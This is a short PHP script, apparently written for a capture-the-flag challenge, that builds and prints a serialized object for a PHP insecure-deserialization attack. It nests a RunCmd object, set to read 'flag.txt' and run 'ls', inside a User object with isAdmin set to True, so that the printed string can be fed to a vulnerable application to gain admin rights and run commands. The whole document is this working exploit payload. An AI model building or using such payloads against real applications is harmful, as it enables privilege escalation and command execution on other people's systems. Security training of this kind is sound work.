<?php

    class RunCmd{
        public function __construct(){
            $this->filetoread = "flag.txt";
            $this->cmd = "ls";
        }
    }


    class User{
        public function __construct(){
            $this->username = new RunCmd();
            $this->isAdmin = True;
        }
    }

    $object = new User();
    echo serialize($object);

?>